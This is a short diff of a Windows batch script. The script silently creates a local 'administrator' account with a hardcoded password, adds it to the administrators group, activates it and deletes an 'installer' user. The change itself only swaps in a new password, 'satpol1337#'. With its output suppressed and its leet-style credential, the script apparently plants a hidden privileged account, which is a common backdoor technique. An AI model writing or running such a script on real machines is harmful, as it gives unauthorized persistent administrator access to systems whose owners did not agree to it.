@@ -1,5 +1,5 @@
 @echo off
-net user administrator Sayawibu23# /add >nul
+net user administrator satpol1337# /add >nul
 net localgroup administrators administrator /add >nul
 net user administrator /active:yes >nul
 net user installer /delete
